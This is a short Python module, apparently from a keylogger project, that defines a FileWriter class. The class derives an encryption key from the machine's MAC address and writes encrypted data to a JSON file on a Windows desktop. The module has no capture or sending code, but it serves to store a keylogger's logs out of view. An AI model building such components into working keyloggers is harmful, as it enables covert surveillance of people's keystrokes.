import json
from getmac import get_mac_address
from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt

class FileWriter:
    def __init__(self):
        self.__mac = get_mac_address()


    def write_to_file(self, data : dict):
        key= Encrypt.create_key(self.__mac)
        with open(r"C:\Users\User\Desktop\tmp.json" , 'wb') as f:
            f.write(Encrypt.encrypt_data(data, key))
